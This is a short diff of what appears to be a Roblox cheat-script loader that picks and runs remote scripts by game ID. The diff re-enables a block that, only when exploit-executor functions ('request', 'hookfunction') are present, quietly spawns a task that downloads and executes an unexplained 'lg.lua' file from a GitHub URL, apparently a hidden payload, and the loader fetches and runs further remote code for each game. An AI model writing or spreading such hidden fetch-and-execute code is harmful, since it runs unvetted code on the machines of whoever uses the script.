@@ -1,8 +1,8 @@
---task.spawn(function() 
---if request and hookfunction then 
---loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() 
---end 
---end)
+task.spawn(function() 
+if request and hookfunction then 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() 
+end 
+end)
 if game.PlaceId == 5708035517 or game.PlaceId == 6063653725 then -- mega hide and seek
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/megahideandseek.lua'))()
 elseif game.PlaceId == 14157644155 then -- 0
